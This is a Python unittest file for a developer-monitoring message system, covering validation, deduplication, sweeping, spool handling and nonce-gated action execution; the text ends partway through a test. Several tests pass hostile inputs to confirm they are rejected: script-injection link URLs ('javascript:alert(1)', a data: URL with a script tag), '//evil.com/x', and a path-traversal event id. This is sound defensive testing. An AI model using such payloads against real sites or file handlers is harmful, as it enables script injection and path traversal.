#!/usr/bin/env python3
"""Dev Monitor message-stream delta tests (stdlib unittest, zero dependencies).

Covers review §10: validation, deduplication, coalescing, crash recovery, urgent promotion, read ≠ Slack, sweep, and flood control
+ spool adversarial cases (symlink/FIFO/oversize/filename mismatch/no-clobber) + owner gate/fail-closed/CSRF.

Run: python3 test_devmon.py
"""
import json
import os
import re
import stat
import sqlite3
import subprocess
import tempfile
import threading
import unittest
import unittest.mock
from datetime import timedelta

import devmon_messages as MSG
import devmon_spool
import devmon_owner
import action_runner
import devmon_slack


def fresh_db():
    fd, path = tempfile.mkstemp(suffix='.db')
    os.close(fd)
    os.remove(path)
    MSG._local = threading.local()          # Discard the previous test's thread-local connection
    MSG.init_db(path)
    return path


def msg(event_id='resource-1', group_key='resource:disk', kind='action',
        urgency='normal', created=None, **extra):
    p = {
        'schema_version': 1, 'event_id': event_id, 'group_key': group_key,
        'source': 'resource', 'kind': kind, 'urgency': urgency,
        'title': 'Disk 92%', 'body': 'Clean up?',
        'created_at': created or MSG.iso(MSG.now_utc()),
    }
    if kind == 'action':
        p['recommended_action'] = {'cwd': '/tmp/project',
                                   'prompt': 'Clean this up', 'explain': 'What and why'}
    elif kind == 'link':
        p['link'] = {'url': 'https://github.com/example-org/project/pull/142',
                     'label': 'PR #142'}
    else:
        p.update(outcome='o', why_it_matters='w', followup='none')
    p.update(extra)
    return p


class TestValidation(unittest.TestCase):
    def setUp(self):
        fresh_db()

    def test_valid_action(self):
        self.assertEqual(MSG.ingest(msg()), 'inserted')

    def test_valid_info(self):
        self.assertEqual(MSG.ingest(msg(kind='info')), 'inserted')

    def test_skill_prompt_xor(self):
        p = msg()
        p['recommended_action']['skill'] = 'harness-gardener'   # both skill and prompt
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_exec_third_mode_valid(self):
        p = msg(); del p['recommended_action']['prompt']
        p['recommended_action']['exec'] = ['/bin/echo', 'hi']   # direct executable (validation does not check existence)
        self.assertEqual(MSG.ingest(p), 'inserted')

    def test_exec_plus_prompt_rejected(self):
        p = msg()                                               # prompt already present
        p['recommended_action']['exec'] = ['/bin/echo']         # + exec → two modes
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_exec_empty_string_element_rejected(self):
        p = msg(); del p['recommended_action']['prompt']
        p['recommended_action']['exec'] = ['']                  # empty string element
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_urgent_action_needs_action(self):
        p = msg(kind='action', urgency='urgent')
        del p['recommended_action']
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_future_rejected(self):
        future = MSG.iso(MSG.now_utc() + timedelta(hours=1))
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(msg(created=future))

    def test_bad_id_rejected(self):
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(msg(event_id='bad id/../x'))

    def test_id_with_a_trailing_newline_rejected(self):
        """Python's `$` also matches before a trailing newline.

        While ID_RE ended at `$` these ids were accepted, so a spool file named
        `e1\\n.json` — a legal filename, and the spool requires the name to equal the
        event_id — produced a card whose identity carried a control character into the
        Slack line and the audit log. The second case is the length cap: 128 + '\\n' is
        129 characters and was accepted as if it were 128.
        """
        for bad in ('ok\n', 'a' * 128 + '\n'):
            with self.assertRaises(MSG.ValidationError):
                MSG.ingest(msg(event_id=bad))
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(msg(group_key='resource:disk\n'))

    def test_skill_pattern_is_anchored_at_end_of_string(self):
        # Both SKILL_RE call sites .strip() first, so an ingest-level case would pass with
        # or without the anchor and could not detect a regression. This asserts the
        # property the anchor provides rather than the one strip() happens to provide.
        self.assertIsNone(MSG.SKILL_RE.match('cleanup\n'))

    def test_naive_ts_rejected(self):
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(msg(created='2026-07-20T14:00:00'))   # no timezone

    def test_schema_version_bool_rejected(self):
        p = msg(); p['schema_version'] = True                # True == 1, but booleans are rejected
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_info_requires_fields(self):
        p = msg(kind='info')
        del p['outcome']
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)


class TestLink(unittest.TestCase):
    def setUp(self):
        fresh_db()

    def test_valid_link(self):
        self.assertEqual(MSG.ingest(msg(kind='link')), 'inserted')
        row = MSG._conn().execute('SELECT kind, link_json FROM cards').fetchone()
        self.assertEqual(row['kind'], 'link')
        self.assertEqual(json.loads(row['link_json'])['url'],
                         'https://github.com/example-org/project/pull/142')

    def test_link_in_card_dict(self):
        MSG.ingest(msg(kind='link'))
        card = MSG.feed()['messages'][0]
        self.assertEqual(card['link']['label'], 'PR #142')
        self.assertIsNone(card['action'])

    def test_link_requires_object(self):
        p = msg(kind='link')
        del p['link']
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_link_rejects_javascript_scheme(self):
        p = msg(kind='link')
        p['link'] = {'url': 'javascript:alert(1)'}
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_link_rejects_data_scheme(self):
        p = msg(kind='link')
        p['link'] = {'url': 'data:text/html,<script>alert(1)</script>'}
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_link_rejects_relative_and_protocol_relative(self):
        for bad in ('/monitor/api/owner/messages', '//evil.com/x', 'ftp://h/x', 'foo'):
            p = msg(kind='link')
            p['link'] = {'url': bad}
            with self.assertRaises(MSG.ValidationError):
                MSG.ingest(p)

    def test_link_rejects_hostless_authority(self):
        # #8: netloc present but no hostname (":443", "@") → reject
        for bad in ('https://:443', 'http://@', 'https://:8080/path'):
            p = msg(kind='link')
            p['link'] = {'url': bad}
            with self.assertRaises(MSG.ValidationError):
                MSG.ingest(p)

    def test_link_url_length_capped(self):
        p = msg(kind='link')
        p['link'] = {'url': 'https://x/' + 'a' * (MSG.MAX_URL + 10)}
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_link_urgent_pins_and_slack(self):
        MSG.ingest(msg(kind='link', urgency='urgent'))
        row = MSG._conn().execute('SELECT pinned FROM cards').fetchone()
        self.assertEqual(row['pinned'], 1)
        self.assertEqual(
            MSG._conn().execute('SELECT COUNT(*) FROM deliveries').fetchone()[0], 1)

    def test_different_url_new_card_same_group(self):
        MSG.ingest(msg(event_id='l1', group_key='g', kind='link'))
        p2 = msg(event_id='l2', group_key='g', kind='link')
        p2['link'] = {'url': 'https://github.com/example-org/project/pull/999'}
        MSG.ingest(p2)
        self.assertEqual(MSG._conn().execute(
            'SELECT COUNT(*) FROM cards').fetchone()[0], 2)   # Different URLs yield different digests → separate cards

    def test_same_url_coalesces(self):
        MSG.ingest(msg(event_id='l1', group_key='g', kind='link'))
        self.assertEqual(
            MSG.ingest(msg(event_id='l2', group_key='g', kind='link')), 'coalesced')


class TestIngest(unittest.TestCase):
    def setUp(self):
        fresh_db()

    def _count(self, table):
        return MSG._conn().execute(f'SELECT COUNT(*) FROM {table}').fetchone()[0]

    def test_insert_creates_card_and_occurrence(self):
        MSG.ingest(msg())
        self.assertEqual(self._count('cards'), 1)
        self.assertEqual(self._count('occurrences'), 1)

    def test_dedup_same_event_id(self):
        MSG.ingest(msg(event_id='e1'))
        self.assertEqual(MSG.ingest(msg(event_id='e1')), 'duplicate')
        self.assertEqual(self._count('cards'), 1)
        self.assertEqual(self._count('occurrences'), 1)

    def test_coalesce_same_group(self):
        MSG.ingest(msg(event_id='e1', group_key='g'))
        self.assertEqual(MSG.ingest(msg(event_id='e2', group_key='g')), 'coalesced')
        self.assertEqual(self._count('cards'), 1)
        self.assertEqual(self._count('occurrences'), 2)
        row = MSG._conn().execute('SELECT occurrence_count FROM cards').fetchone()
        self.assertEqual(row['occurrence_count'], 2)

    def test_coalesce_resets_read(self):
        MSG.ingest(msg(event_id='e1', group_key='g'))
        cid = MSG._conn().execute('SELECT card_id FROM cards').fetchone()['card_id']
        MSG.mark_read(cid)
        self.assertIsNotNone(MSG._conn().execute(
            'SELECT read_at FROM cards').fetchone()['read_at'])
        MSG.ingest(msg(event_id='e2', group_key='g'))       # a new occurrence restores the unread state
        self.assertIsNone(MSG._conn().execute(
            'SELECT read_at FROM cards').fetchone()['read_at'])

    def test_different_digest_new_card(self):
        MSG.ingest(msg(event_id='e1', group_key='g', kind='info'))
        MSG.ingest(msg(event_id='e2', group_key='g', kind='action'))  # different digest
        self.assertEqual(self._count('cards'), 2)

    def test_urgent_promotion_pins(self):
        MSG.ingest(msg(event_id='e1', group_key='g', urgency='normal'))
        MSG.ingest(msg(event_id='e2', group_key='g', urgency='urgent'))
        row = MSG._conn().execute('SELECT urgency, pinned FROM cards').fetchone()
        self.assertEqual(row['urgency'], 'urgent')
        self.assertEqual(row['pinned'], 1)

    def test_crash_reprocess_stable(self):
        # a crash after commit and before deletion re-ingests the same payload → duplicate; count remains unchanged (C2)
        MSG.ingest(msg(event_id='e1', group_key='g'))
        MSG.ingest(msg(event_id='e2', group_key='g'))       # coalesced, count=2
        self.assertEqual(MSG.ingest(msg(event_id='e2', group_key='g')), 'duplicate')
        self.assertEqual(MSG._conn().execute(
            'SELECT occurrence_count FROM cards').fetchone()['occurrence_count'], 2)

    def test_urgent_enqueues_slack(self):
        MSG.ingest(msg(urgency='urgent'))
        self.assertEqual(self._count('deliveries'), 1)

    def test_normal_no_slack(self):
        MSG.ingest(msg(urgency='normal'))
        self.assertEqual(self._count('deliveries'), 0)


class TestStateAndCounts(unittest.TestCase):
    def setUp(self):
        fresh_db()
        MSG.ingest(msg(event_id='e1', group_key='g1', urgency='urgent'))
        self.cid = MSG._conn().execute(
            "SELECT card_id FROM cards WHERE group_key='g1'").fetchone()['card_id']

    def test_read_idempotent_transition(self):
        self.assertTrue(MSG.mark_read(self.cid))
        self.assertFalse(MSG.mark_read(self.cid))            # already read → False

    def test_dismiss_undismiss(self):
        self.assertTrue(MSG.dismiss(self.cid))
        self.assertEqual(MSG.counts()['active'], 0)
        self.assertTrue(MSG.undismiss(self.cid))
        self.assertEqual(MSG.counts()['active'], 1)

    def test_read_neq_slack(self):
        # Sending to Slack preserves the unread count (orthogonal)
        MSG._conn().execute('UPDATE cards SET slack_sent_at=? WHERE card_id=?',
                           (MSG.iso(MSG.now_utc()), self.cid))
        MSG._conn().commit()
        self.assertEqual(MSG.unread_count(), 1)              # unread even with Slack delivery
        MSG.mark_read(self.cid)
        self.assertEqual(MSG.unread_count(), 0)

    def test_dismiss_excluded_from_unread(self):
        self.assertEqual(MSG.unread_count(), 1)
        MSG.dismiss(self.cid)
        self.assertEqual(MSG.unread_count(), 0)

    def test_preview_caps_5(self):
        for i in range(8):
            MSG.ingest(msg(event_id=f'p{i}', group_key=f'gp{i}'))
        pv = MSG.preview()
        self.assertEqual(len(pv['messages']), 5)
        self.assertEqual(pv['unread_count'], 9)             # global total (g1 + 8)


class TestSweep(unittest.TestCase):
    def setUp(self):
        fresh_db()

    def test_old_run_schema_gets_lifecycle_columns(self):
        fd, path = tempfile.mkstemp(suffix='.db')
        os.close(fd)
        c = sqlite3.connect(path)
        c.execute(
            'CREATE TABLE runs (run_id TEXT PRIMARY KEY, card_id TEXT NOT NULL, '
            'plan_sha256 TEXT NOT NULL, plan_json TEXT NOT NULL, status TEXT NOT NULL, '
            'tmux_target TEXT, exit_code INTEGER, error TEXT, created_at TEXT NOT NULL, '
            'started_at TEXT, ended_at TEXT)')
        c.commit()
        c.close()
        MSG._local = threading.local()
        MSG.init_db(path)
        columns = {row[1] for row in MSG._conn().execute('PRAGMA table_info(runs)').fetchall()}
        self.assertTrue({'keep_requested', 'kept_at', 'reclaimed_at'} <= columns)

    def test_purge_180d(self):
        MSG.ingest(msg(event_id='old', group_key='g'))
        old = MSG.iso(MSG.now_utc() - timedelta(days=200))
        c = MSG._conn()
        c.execute('UPDATE cards SET received_at=?', (old,))
        c.execute('UPDATE occurrences SET received_at=?', (old,))
        c.commit()
        MSG.sweep()
        self.assertEqual(c.execute('SELECT COUNT(*) FROM cards').fetchone()[0], 0)
        self.assertEqual(c.execute('SELECT COUNT(*) FROM occurrences').fetchone()[0], 0)

    def test_purge_also_clears_runs_approvals_deliveries(self):
        # #7: the 180-day purge also clears the new tables (approvals/runs/deliveries)
        tmp = tempfile.mkdtemp()
        cfg = {'cwd_root': os.path.dirname(tmp)}  # tmp is below the root (strict-under)
        p = {'schema_version': 1, 'event_id': 'a1', 'group_key': 'g', 'source': 's',
             'kind': 'action', 'urgency': 'urgent', 'title': 'T',
             'created_at': MSG.iso(MSG.now_utc()),
             'recommended_action': {'cwd': tmp, 'prompt': 'p', 'explain': 'w'}}
        MSG.ingest(p)                                  # urgent → one delivery
        appr = MSG.issue_approval('a1', cfg)           # one approval
        res = MSG.redeem_approval('a1', appr['nonce'], cfg)  # one run
        MSG.run_finish(res['run_id'], 0)               # completion clears card.run_id (it is no longer active)
        c = MSG._conn()
        old = MSG.iso(MSG.now_utc() - timedelta(days=200))
        c.execute('UPDATE cards SET received_at=?', (old,)); c.commit()
        MSG.sweep()
        for t in ('cards', 'approvals', 'runs', 'deliveries', 'occurrences'):
            self.assertEqual(c.execute(f'SELECT COUNT(*) FROM {t}').fetchone()[0], 0, t)

    def test_purge_skips_card_with_active_run(self):
        # #7 regression guard: a card with an active run (run_id) is not deleted after 180 days (prevents tmux orphans)
        tmp = tempfile.mkdtemp()
        cfg = {'cwd_root': os.path.dirname(tmp)}  # tmp is below the root (strict-under)
        p = {'schema_version': 1, 'event_id': 'a1', 'group_key': 'g', 'source': 's',
             'kind': 'action', 'urgency': 'normal', 'title': 'T',
             'created_at': MSG.iso(MSG.now_utc()),
             'recommended_action': {'cwd': tmp, 'prompt': 'p', 'explain': 'w'}}
        MSG.ingest(p)
        appr = MSG.issue_approval('a1', cfg)
        MSG.redeem_approval('a1', appr['nonce'], cfg)   # run active — card.run_id set
        c = MSG._conn()
        c.execute('UPDATE cards SET received_at=?', (MSG.iso(MSG.now_utc() - timedelta(days=200)),))
        c.commit()
        MSG.sweep()
        self.assertEqual(c.execute('SELECT COUNT(*) FROM cards').fetchone()[0], 1)  # not deleted

    def test_purge_skips_card_with_kept_run(self):
        # A kept window may outlive the normal card retention, so its run record must not be
        # purged while the reaper still needs the Keep exemption.
        tmp = tempfile.mkdtemp()
        cfg = {'cwd_root': os.path.dirname(tmp)}
        p = {'schema_version': 1, 'event_id': 'kept', 'group_key': 'kept', 'source': 's',
             'kind': 'action', 'urgency': 'normal', 'title': 'T',
             'created_at': MSG.iso(MSG.now_utc()),
             'recommended_action': {'cwd': tmp, 'prompt': 'p', 'explain': 'w'}}
        MSG.ingest(p)
        appr = MSG.issue_approval('kept', cfg)
        res = MSG.redeem_approval('kept', appr['nonce'], cfg)
        MSG.run_finish(res['run_id'], 0)
        self.assertEqual(MSG.run_keep(res['run_id']), (True, None))
        c = MSG._conn()
        c.execute('UPDATE cards SET received_at=?',
                  (MSG.iso(MSG.now_utc() - timedelta(days=200)),))
        c.commit()
        MSG.sweep()
        self.assertEqual(c.execute('SELECT COUNT(*) FROM cards').fetchone()[0], 1)
        self.assertEqual(c.execute('SELECT COUNT(*) FROM runs').fetchone()[0], 1)

    def test_purge_skips_unreclaimed_terminal_target(self):
        # If the monitor was down when the 24h reaper should have run, retain the target record
        # so a later sweep can still kill the correct generation instead of orphaning the pane.
        tmp = tempfile.mkdtemp()
        cfg = {'cwd_root': os.path.dirname(tmp)}
        p = {'schema_version': 1, 'event_id': 'targeted', 'group_key': 'targeted', 'source': 's',
             'kind': 'action', 'urgency': 'normal', 'title': 'T',
             'created_at': MSG.iso(MSG.now_utc()),
             'recommended_action': {'cwd': tmp, 'prompt': 'p', 'explain': 'w'}}
        MSG.ingest(p)
        appr = MSG.issue_approval('targeted', cfg)
        res = MSG.redeem_approval('targeted', appr['nonce'], cfg)
        MSG.run_mark_running(res['run_id'], 'p1:@1')
        MSG.run_finish(res['run_id'], 0)
        c = MSG._conn()
        c.execute('UPDATE cards SET received_at=? WHERE card_id=?',
                  (MSG.iso(MSG.now_utc() - timedelta(days=200)), 'targeted'))
        c.commit()
        MSG.sweep()
        self.assertIsNotNone(c.execute('SELECT card_id FROM cards WHERE card_id=?',
                                       ('targeted',)).fetchone())
        self.assertIsNotNone(MSG.get_run(res['run_id']))
        self.assertEqual(c.execute('SELECT COUNT(*) FROM runs').fetchone()[0], 1)

    def test_archive_only_excess_and_not_pinned(self):
        c = MSG._conn()
        old_read = MSG.iso(MSG.now_utc() - timedelta(hours=72))
        # 22 cards, all read and idle; one is pinned.
        for i in range(22):
            MSG.ingest(msg(event_id=f'e{i}', group_key=f'g{i}', urgency='normal'))
        c.execute('UPDATE cards SET read_at=?, last_seen=?, received_at=?',
                  (old_read, old_read, old_read))
        c.execute("UPDATE cards SET pinned=1 WHERE card_id='e0'")
        c.commit()
        MSG.sweep()
        active = MSG.counts()['active']
        # 22 active → archive 2 excess cards → 20 remain. The pinned e0 is excluded and remains.
        self.assertEqual(active, 20)
        self.assertEqual(c.execute(
            "SELECT archived_at FROM cards WHERE card_id='e0'").fetchone()['archived_at'], None)


class TestFlood(unittest.TestCase):
    def setUp(self):
        fresh_db()

    def test_flood_synthesizes_urgent_card(self):
        for i in range(MSG.FLOOD_THRESHOLD):
            MSG.ingest(msg(event_id=f'f{i}', group_key='noisy', urgency='normal'))
        flood = MSG._conn().execute(
            "SELECT * FROM cards WHERE group_key LIKE 'pipe:flood:%'").fetchall()
        self.assertEqual(len(flood), 1)
        self.assertEqual(flood[0]['urgency'], 'urgent')
        self.assertEqual(flood[0]['pinned'], 1)

    def test_flood_no_recursion(self):
        # the flood card itself does not trigger another flood
        for i in range(MSG.FLOOD_THRESHOLD + 5):
            MSG.ingest(msg(event_id=f'f{i}', group_key='noisy'))
        flood = MSG._conn().execute(
            "SELECT COUNT(*) FROM cards WHERE group_key LIKE 'pipe:flood:pipe:flood%'"
        ).fetchone()[0]
        self.assertEqual(flood, 0)


class TestSpool(unittest.TestCase):
    def setUp(self):
        fresh_db()
        self.spool = tempfile.mkdtemp()
        devmon_spool.ensure_dirs(self.spool)

    def _drop(self, name, content):
        """Simulate link(2) publication: tmp write → link → tmp unlink."""
        tmp = os.path.join(self.spool, 'tmp', 'x')
        with open(tmp, 'w') as f:
            f.write(content)
        os.link(tmp, os.path.join(self.spool, 'new', name))
        os.remove(tmp)

    def test_normal_ingest(self):
        self._drop('resource-1.json', json.dumps(msg(event_id='resource-1')))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['inserted'], 1)
        self.assertEqual(os.listdir(os.path.join(self.spool, 'new')), [])   # consumed

    def test_symlink_rejected(self):
        target = os.path.join(self.spool, 'tmp', 'secret')
        with open(target, 'w') as f:
            f.write('secret')
        os.symlink(target, os.path.join(self.spool, 'new', 'resource-1.json'))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['bad'], 1)
        self.assertEqual(r['inserted'], 0)

    def test_fifo_rejected(self):
        os.mkfifo(os.path.join(self.spool, 'new', 'resource-1.json'))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['bad'], 1)

    def test_oversize_rejected(self):
        big = msg(event_id='resource-1')
        big['body'] = 'x' * (MSG.MAX_PAYLOAD + 100)
        self._drop('resource-1.json', json.dumps(big))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['bad'], 1)

    def test_filename_mismatch_rejected(self):
        self._drop('wrong-name.json', json.dumps(msg(event_id='resource-1')))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['bad'], 1)

    def test_no_clobber_link(self):
        self._drop('resource-1.json', json.dumps(msg(event_id='resource-1')))
        # a second link with the same name → EEXIST (producer contract: deduplication)
        tmp = os.path.join(self.spool, 'tmp', 'y')
        with open(tmp, 'w') as f:
            f.write('{}')
        with self.assertRaises(FileExistsError):
            os.link(tmp, os.path.join(self.spool, 'new', 'resource-1.json'))
        os.remove(tmp)

    def test_processing_leftover_recovered(self):
        # a processing/ leftover (crash simulation) → scan returns it to new for reprocessing
        self._drop('resource-1.json', json.dumps(msg(event_id='resource-1')))
        os.rename(os.path.join(self.spool, 'new', 'resource-1.json'),
                  os.path.join(self.spool, 'processing', 'resource-1.json'))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['inserted'], 1)


class TestExec(unittest.TestCase):
    def setUp(self):
        fresh_db()
        self.tmp = tempfile.mkdtemp()
        self.proj = os.path.join(self.tmp, 'proj')      # project below root (=tmp) — strict-under
        os.makedirs(self.proj, exist_ok=True)
        self.cfg = {'cwd_root': self.tmp}

    def _action(self, cwd=None, skill=None, prompt='Clean this up', exec_argv=None, event_id='a1', group_key='g'):
        p = {'schema_version': 1, 'event_id': event_id, 'group_key': group_key,
             'source': 'resource', 'kind': 'action', 'urgency': 'normal',
             'title': 'T', 'created_at': MSG.iso(MSG.now_utc()),
             'recommended_action': {'cwd': cwd if cwd is not None else self.proj, 'explain': 'why'}}
        if exec_argv is not None:
            p['recommended_action']['exec'] = exec_argv
        elif skill:
            p['recommended_action']['skill'] = skill
        else:
            p['recommended_action']['prompt'] = prompt
        MSG.ingest(p)
        return event_id

    def test_exec_file_plan(self):
        # direct executable — an absolute, existing, executable path can run through plan.exec (without Claude)
        prog = os.path.join(self.proj, 'run.sh')
        with open(prog, 'w') as f:
            f.write('#!/bin/sh\necho hi\n')
        os.chmod(prog, 0o755)
        cid = self._action(exec_argv=[prog, '--flag'])
        res = MSG.issue_approval(cid, self.cfg)
        self.assertTrue(res['ok'])
        self.assertEqual(res['plan']['exec'], [os.path.realpath(prog), '--flag'])
        self.assertNotIn('prompt', res['plan'])
        self.assertNotIn('skill', res['plan'])

    def test_exec_nonexistent_not_executable(self):
        cid = self._action(exec_argv=['/no/such/prog', 'x'])
        res = MSG.issue_approval(cid, self.cfg)
        self.assertFalse(res['ok'])
        self.assertEqual(res['error'], 'not_executable')

    def test_exec_relative_path_rejected(self):
        cid = self._action(exec_argv=['run.sh'])          # not an absolute path
        res = MSG.issue_approval(cid, self.cfg)
        self.assertFalse(res['ok'])

    def test_exec_without_x_bit_rejected(self):
        prog = os.path.join(self.proj, 'nox.sh')
        with open(prog, 'w') as f:
            f.write('#!/bin/sh\n')
        os.chmod(prog, 0o644)                              # not executable
        cid = self._action(exec_argv=[prog])
        res = MSG.issue_approval(cid, self.cfg)
        self.assertFalse(res['ok'])                      # new cards have card_id == event_id

    def test_plan_issues_nonce(self):
        cid = self._action()
        res = MSG.issue_approval(cid, self.cfg)
        self.assertTrue(res['ok'])
        self.assertTrue(res['nonce'])
        self.assertEqual(res['plan']['cwd'], os.path.realpath(self.proj))
        self.assertEqual(res['plan']['prompt'], 'Clean this up')

    def test_canonical_plan_deterministic(self):
        cid = self._action()
        card = MSG._conn().execute('SELECT * FROM cards WHERE card_id=?', (cid,)).fetchone()
        _, sha1 = MSG.canonical_plan(card, self.cfg)
        _, sha2 = MSG.canonical_plan(card, self.cfg)
        self.assertEqual(sha1, sha2)

    def test_execute_redeems_and_creates_run(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertTrue(res['ok'])
        run = MSG.get_run(res['run_id'])
        self.assertEqual(run['status'], 'starting')
        card = MSG._conn().execute('SELECT run_id FROM cards WHERE card_id=?', (cid,)).fetchone()
        self.assertEqual(card['run_id'], res['run_id'])

    def test_nonce_single_use(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_finish(res['run_id'], 0)                 # run completes and clears card.run_id
        # a second redemption of the same nonce → nonce_used (not reusable even after the run completes)
        res2 = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertFalse(res2['ok'])
        self.assertEqual(res2['error'], 'nonce_used')

    def test_bad_nonce_rejected(self):
        cid = self._action()
        MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, 'not-a-real-nonce', self.cfg)
        self.assertEqual(res['error'], 'no_approval')

    def test_plan_stale_on_dismiss(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        MSG.dismiss(cid)                       # card dismissed after approval → not executable
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertEqual(res['error'], 'plan_stale')

    def test_expired_nonce(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        past = MSG.iso(MSG.now_utc() - timedelta(minutes=1))
        c = MSG._conn(); c.execute('UPDATE approvals SET expires_at=?', (past,)); c.commit()
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertEqual(res['error'], 'expired')

    def test_cwd_outside_root_not_executable(self):
        outside = tempfile.mkdtemp()           # outside cwd_root
        cid = self._action(cwd=outside)
        res = MSG.issue_approval(cid, self.cfg)
        self.assertFalse(res['ok'])
        self.assertEqual(res['error'], 'not_executable')

    def test_cwd_missing_not_executable(self):
        cid = self._action(cwd=os.path.join(self.tmp, 'nope'))
        res = MSG.issue_approval(cid, self.cfg)
        self.assertEqual(res['error'], 'not_executable')

    def test_cwd_equals_root_not_executable(self):
        # the root itself (equivalent to $HOME) is rejected — only child projects are allowed
        cid = self._action(cwd=self.tmp)
        res = MSG.issue_approval(cid, self.cfg)
        self.assertFalse(res['ok'])
        self.assertEqual(res['error'], 'not_executable')

    def test_cwd_arbitrary_subdir_executable(self):
        # any directory below root is executable regardless of naming (workspace, b-workspace, etc.)
        sub = os.path.join(self.tmp, 'b-workspace', 'proj2'); os.makedirs(sub)
        cid = self._action(cwd=sub)
        res = MSG.issue_approval(cid, self.cfg)
        self.assertTrue(res['ok'])

    def test_run_active_blocks_second_plan(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        res = MSG.issue_approval(cid, self.cfg)          # running → reject a new plan
        self.assertEqual(res['error'], 'run_active')

    def test_run_finish_clears_card(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], '@3')
        MSG.run_finish(res['run_id'], 0)
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'done')
        card = MSG._conn().execute('SELECT run_id FROM cards WHERE card_id=?', (cid,)).fetchone()
        self.assertIsNone(card['run_id'])

    def test_run_finish_nonzero_failed(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_finish(res['run_id'], 1)
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'failed')

    def test_run_stop(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], '@7')
        changed, target = MSG.run_stop(res['run_id'])
        self.assertTrue(changed)
        self.assertEqual(target, '@7')
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'stopped')

    def test_run_keep_is_persistent_and_idempotent(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertEqual(MSG.run_keep(res['run_id']), (True, None))
        MSG.run_finish(res['run_id'], 0)
        self.assertTrue(MSG.get_run(res['run_id'])['keep'])
        self.assertEqual(MSG.run_keep(res['run_id']), (True, None))
        self.assertEqual(MSG.reclaimable_runs(), [])

    # ---- terminal notification cards (so results are not missed when the modal is closed) ----
    def _result_cards(self):
        return [c for c in MSG.feed('active')['messages']
                if c['card_id'].startswith('devmon.runresult.')]

    def test_run_finish_emits_result_card(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_finish(res['run_id'], 0)
        cards = self._result_cards()
        self.assertEqual(len(cards), 1)
        self.assertIn('✅ Run completed', cards[0]['title'])
        self.assertEqual(cards[0]['kind'], 'info')
        self.assertIn('rc=0', cards[0]['body'])
        self.assertEqual(cards[0]['result_run_id'], res['run_id'])

    def test_run_failed_emits_result_card_with_rc(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_finish(res['run_id'], 2)
        cards = self._result_cards()
        self.assertEqual(len(cards), 1)
        self.assertIn('Run failed', cards[0]['title'])
        self.assertIn('rc=2', cards[0]['body'])

    def test_run_stop_emits_no_card(self):
        # termination caused by the owner just pressing 'Stop' → zero new information to notify.
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], '@9')
        MSG.run_stop(res['run_id'])
        self.assertEqual(self._result_cards(), [])

    def test_run_finish_twice_emits_one_card(self):
        # reprocessing the sentinel (idempotent) — an unchanged termination produces no notification.
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_finish(res['run_id'], 0)
        MSG.run_finish(res['run_id'], 0)
        self.assertEqual(len(self._result_cards()), 1)

    def test_two_runs_emit_two_cards(self):
        # one card per run — coalescing would lose which run finished.
        cid = self._action()
        for _ in range(2):
            appr = MSG.issue_approval(cid, self.cfg)
            res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
            MSG.run_finish(res['run_id'], 0)
        self.assertEqual(len(self._result_cards()), 2)

    def test_mark_running_true_when_starting(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
